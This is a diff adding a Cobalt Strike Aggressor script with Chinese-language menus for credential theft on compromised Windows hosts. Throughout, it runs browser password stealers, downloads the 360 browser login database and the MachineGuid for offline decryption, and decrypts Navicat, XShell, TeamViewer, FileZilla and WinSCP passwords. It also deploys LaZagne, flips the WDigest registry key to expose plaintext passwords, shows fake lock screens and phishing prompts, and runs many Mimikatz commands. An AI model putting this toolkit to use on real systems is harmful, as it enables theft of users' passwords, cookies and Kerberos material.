@@ -1,0 +1,328 @@
+menu "凭据获取" {
+	menu "获取浏览器密码" {
+		item "BrowerGhost(Chrome/IE)" {
+			blog($1, "-------------------------------------------------------------获取浏览器密码(BrowerGhost)---------------------------------------------------");
+			blog($1, " 这是一个抓取浏览器密码的工具，目前支持抓取 Chrome浏览器 和 IE浏览器 的数据。");
+			bexecute_assembly($1, script_resource("/exe/BrowserGhost.exe"));		
+		}
+		item "Shareweb(Chrome/Firefox/IE)" {
+			$bid = $1;
+			$dialog = dialog("ShareWeb", %(select => "all", bid => $bid), &ShareWeb);
+			dialog_description($dialog, "这是一款获取浏览器密码的工具，目前支持获取 Chrome、Firefox、IE/Edge 浏览器的数据。");
+			drow_combobox($dialog, "select", "选择抓取的对象:", @("all","chrome","firefox", "edge"));
+			dbutton_action($dialog, "确定");
+			dialog_show($dialog);
+		}
+		sub ShareWeb{
+			blog($bid, "-------------------------------------------------------------获取浏览器密码(Shareweb)--------------------------------------------------------");
+			blog($bid, "这是一款获取浏览器密码的工具，目前支持获取 Chrome、Firefox、IE/Edge 浏览器的数据。");
+			bexecute_assembly($bid, script_resource('/exe/SharpWeb.exe'), "$3['select']");
+		}
+		item "SharpChromium(Chrome)" {
+			$bid = $1;
+			$dialog = dialog("SharpChromium", %(select => "all", bid => $bid), &SharpChromium);
+			dialog_description($dialog, "这是一款专门抓取Chrome浏览器密码的工具。默认会获取账号密码、history和cookies");
+			drow_combobox($dialog, "select", "选择抓取的对象:", @("all","logins","history", "cookies"));
+			dbutton_action($dialog, "确定");
+			dialog_show($dialog);	
+		}
+		sub SharpChromium {
+			blog($bid, "-------------------------------------------------------------获取浏览器密码(SharpChromium)--------------------------------------------------------");
+			blog($bid, "这是一款专门抓取Chrome浏览器密码的工具。默认会获取账号密码、历史浏览记录和Cookies");
+			bexecute_assembly($bid, script_resource('/exe/SharpChromium.exe'), "$3['select']");
+		}
+
+		item "360安全浏览器" {
+			blog($1, "-------------------------------------------------------------获取360安全浏览器账号密码--------------------------------------------------------");
+			blog($1, "通过下载浏览器数据库、记录密钥来离线解密浏览器密码");
+			$bid = $1['@'];
+			SafeBrowsergetpass($bid);
+			getMachineGuid($bid);
+		}
+		sub SafeBrowsergetpass {
+			bshell($bid, 'reg query HKEY_CLASSES_ROOT\360seURL\shell\open\command|findstr exe');
+		}
+		sub getMachineGuid{
+			$arch = barch($1);
+			if ($arch == 'x64'){
+				breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
+			}
+			else{
+				breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x86");
+				breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
+			}
+		}
+		on beacon_output {
+			$magicstring = "360se6\\Application\\360se.exe";
+			$magicstring2 = "MachineGuid";
+
+			if ($magicstring isin $2){
+				$length = strlen($2);
+				$last = lindexOf($2, ":");
+				$res = substr($2, $last - 1, $length - 32);
+				$dbPath = "User Data\\Default\\apps\\LoginAssis\\assis2.db";
+				$res = $res . $dbPath;
+
+				bdownload($1, $res);
+				blog($1,"360 SafeBrowser DB Downloading");
+			}
+
+			if ($magicstring2 isin $2){
+				$lasta = lindexOf($2, "\nMachineGuid");
+				$MachineGuid = substr($2, $lasta + 26, -1); 
+				$beaconHost = beacon_info($1, "host");
+				credential_add($empty,$MachineGuid, $empty, $empty, $beaconHost);
+				blog($1,"MachineGuid Get Success");
+			}
+		}
+		menu "hack-browser-data"{
+			item "上传hack-browser-data" {
+				$bid = $1;
+				$dialog = dialog("上传hack-browser-data.exe", %(UploadPath => "C:\\Windows\\Temp\\test\\", bid => $bid), &upload_hack-browser-data);
+				drow_text($dialog, "UploadPath",  "上传路径: "); 
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+			}
+			sub upload_hack-browser-data{
+				bupload($bid, script_resource("/exe/hack-browser-data.exe"));
+			}
+			item "运行hack-browser-data" {
+				blog($1, "-----------------------------------------------获取浏览器密码(hack-browser-data)-------------------------------------------------------------");
+				blog($1, "这是一个抓取浏览器密码的工具，目前支持抓取所有常用浏览器： Chrome浏览器、Edge浏览器、360浏览器、Firefox和QQ浏览器的数据。会将结果导出到当前文件夹的results目录内。");
+				bshell($1,"hack-browser-data.exe");
+			}
+			item "删除hack-browser-data" {
+				bshell($1, "del /f /s /q hack-browser-data.exe");
+			}
+		}
+		item "查找浏览器凭据文件"{
+			$bid = $1;
+			$dialog = dialog("查找浏览器凭据文件", %(chrome_qq => "dir /s /b c:\\\"Login Data\"", firefox => "dir /s /b c:\\logins.json", 360 => "dir /s /b c:\\assis2.db", bid => $bid), &search_path);
+			dialog_description($dialog, "这个功能是查找Chrome/qq/firefox/360浏览器账号密码保存的路径.");
+			drow_text($dialog, "chrome_qq",  "Chrome和QQ浏览器: ");
+			drow_text($dialog, "firefox",  "Firefox浏览器: ");
+			drow_text($dialog, "360",  "360安全浏览器: ");
+			dbutton_action($dialog, "确定");
+			dialog_show($dialog);
+		}
+		sub search_path{
+			blog($bid, "-------------------------------------------------------------查找浏览器凭据文件------------------------------------------------------------");
+			blog($bid, "通过查找浏览器凭据文件路径，下载到本地进行解密");
+			bshell($bid, "$3['chrome_qq']");
+			bshell($bid, "$3['firefox']");
+			bshell($bid, "$3['360']");
+		}
+	}
+	item "获取Navicat凭据" {
+		blog($1, "-------------------------------------------------------------获取Navicat凭据-------------------------------------------------------------");
+		bexecute_assembly($1, script_resource('/exe/SharpDecryptPwd.exe'), "-NavicatCrypto");
+	}	
+	item "获取XShell凭据" {
+		$bid = $1['@'];
+		$dialog = dialog("DecryptXShell", %(type => "-Xmangager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &DecryptXShell);
+		dialog_description($dialog, "DecryptXShell");
+		drow_combobox($dialog, "type", "Type:", @("-Xmangager"));
+		drow_text($dialog, "path", "Sessions Path:  ");
+        dbutton_action($dialog, "运行");
+		dialog_show($dialog);
+    }
+	sub DecryptXShell {
+		blog($1, "-------------------------------------------------------------获取XShell凭据-------------------------------------------------------------");
+		$arg = join(' ', @($3['type'],"-p",$3['path']));
+		bexecute_assembly($bid, script_resource("/exe/SharpDecryptPwd.exe"), $arg);
+	}
+	item "获取TeamViewer凭据" {
+		blog($1, "-------------------------------------------------------------获取TeamViewer凭据-------------------------------------------------------------");
+		bexecute_assembly($1, script_resource('/exe/SharpDecryptPwd.exe'), "-TeamViewer");
+	}	
+	item "获取FileZilla凭据" {
+		blog($1, "-------------------------------------------------------------获取FileZilla凭据-------------------------------------------------------------");
+		bexecute_assembly($1, script_resource('/exe/SharpDecryptPwd.exe'), "-FileZilla");
+	}	
+	item "获取WinSCP凭据" {
+		blog($1, "-------------------------------------------------------------获取WinSCP凭据-------------------------------------------------------------");
+		bexecute_assembly($1, script_resource('/exe/SharpDecryptPwd.exe'), "-WinSCP");
+	}
+
+	menu "LaZagne" {
+		item "上传LaZagne" {
+			$bid = $1;
+			$dialog = dialog("上传nbtscan", %(UploadPath => "", bid => $bid), &upload_LaZagne);
+            dialog_description($dialog, "linux和windows通用");
+			drow_text($dialog, "UploadPath",  "上传路径: "); 	
+			dbutton_action($dialog, "上传");
+			dialog_show($dialog);
+		}
+		sub upload_LaZagne {
+			blog($1, "-------------------------------------------------------------上传LaZagne.exe------------------------------------------------------------");
+		    bcd($bid, $3['UploadPath']);
+		    bupload($bid, script_resource("/exe/lazagne.exe"));
+		}
+		item "运行LaZagne" {
+			blog($1, "-------------------------------------------------------------运行LaZagne.exe------------------------------------------------------------");
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "lazagne.exe all");
+			}
+		}
+		item "删除LaZagne" {
+			blog($1, "-------------------------------------------------------------删除LaZagne.exe------------------------------------------------------------");
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "del /f /s /q lazagne.exe");
+			}
+		}
+	}
+	item "win2012修改注册表dump明文" {
+		local('$bid');
+		foreach $bid ($1){
+			bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
+		}
+	}
+	menu "钓鱼获取凭证" {
+		item "FakeLogonScreen" {
+			blog($1, "-------------------------------------------------------------钓鱼获取凭证------------------------------------------------------------");
+			blog($1, "SharpLocker会弹出一个假的Windows锁定屏幕，帮助获得当前的用户凭据，所有输出都将发送到控制台。");
+			bexecute_assembly($1, script_resource("/exe/FakeLogonScreen.exe"));
+		}
+
+		item "CredPhisher" {
+			blog($1, "-------------------------------------------------------------钓鱼获取凭证------------------------------------------------------------");
+			blog($1, "弹出安全认证登录框，钓鱼凭证。");
+			bexecute_assembly($1, script_resource("/exe/CredPhisher.exe"),"Windows has lost connection to Outlook");
+		}
+	}
+	menu "Mimikatz" {
+		item "Mimikatz Logon Passwords"{
+			local('$bid');
+			foreach $bid ($1){
+				logonpasswords($bid);
+			}
+		}
+		item "Mimikatz WDigest Credentials"{
+			local('$bid');
+			foreach $bid ($1){
+				wdigest($bid);
+			}
+		}
+		item "Mimikatz Kerberos Credentials"{
+			local('$bid');
+			foreach $bid ($1){
+				kerberos($bid);
+			}
+		}
+		item "Mimikatz MSV LM & NTLM Passwords"{
+			local('$bid');
+			foreach $bid ($1){
+				msv($bid);
+			}
+		}
+		item "Mimikatz TsPkg Passwords"{
+			local('$bid');
+			foreach $bid ($1){
+				tspkg($bid);
+			}
+		}
+		item "Mimikatz LiveSSP passwords"{
+			local('$bid');
+			foreach $bid ($1){
+				livessp($bid);
+			}
+		}
+		item "Mimikatz SSP passwords"{
+			local('$bid');
+			foreach $bid ($1){
+				ssp($bid);
+			}
+		}
+		item "Mimikatz Dump Trust"{
+			local('$bid');
+			foreach $bid ($1){
+				trust($bid);
+			}
+		}
+		item "Mimikatz Backup Keys"{
+			local('$bid');
+			foreach $bid ($1){
+				backupkeys($bid);
+			}
+		}
+		item "Mimikatz Tickets"{
+			local('$bid');
+			foreach $bid ($1){
+				tickets($bid);
+			}
+		}
+		item "Mimikatz ekeys"{
+			local('$bid');
+			foreach $bid ($1){
+				ekeys($bid);
+			}
+		}
+		item "Mimikatz DPAPI"{
+			local('$bid');
+			foreach $bid ($1){
+				dpapi($bid);
+			}
+		}
+		item "Mimikatz DPAPI System Secret"{
+			local('$bid');
+			foreach $bid ($1){
+				dpapisystem($bid);
+			}
+		}
+		item "Mimikatz Credential Manager"{
+			local('$bid');
+			foreach $bid ($1){
+				credman($bid);
+			}
+		}
+		sub logonpasswords{
+			bmimikatz($1, "sekurlsa::logonpasswords");
+		}
+		sub wdigest{
+			bmimikatz($1, "sekurlsa::wdigest");
+		}
+		sub kerberos{
+			bmimikatz($1, "sekurlsa::kerberos");
+		}
+		sub msv{
+			bmimikatz($1, "sekurlsa::msv");
+		}
+		sub tspkg{
+			bmimikatz($1, "sekurlsa::tspkg");
+		}
+		sub livessp{
+			bmimikatz($1, "sekurlsa::livessp");
+		}
+		sub ssp{
+			bmimikatz($1, "sekurlsa::ssp");
+		}
+		sub trust{
+			bmimikatz($1, "sekurlsa::trust");
+		}
+		sub backupkeys{
+			bmimikatz($1, "sekurlsa::backupkeys");
+		}
+		sub tickets{
+			bmimikatz($1, "sekurlsa::tickets");
+		}
+		sub ekeys{
+			bmimikatz($1, "sekurlsa::ekeys");
+		}
+		sub dpapi{
+			bmimikatz($1, "sekurlsa::dpapi");
+		}
+
+		sub dpapisystem{
+			bmimikatz($1, "sekurlsa::dpapi");
+		}
+		sub credman{
+			bmimikatz($1, "sekurlsa::credman");
+		}
+	}
+	item "SafetyKatz(获取密码详细)" {
+		blog($1, "-------------------------------------------------------------获取密码详细信息------------------------------------------------------------");
+		bexecute_assembly($1, script_resource("/exe/SafetyKatz.exe"), "");
+	}
+}
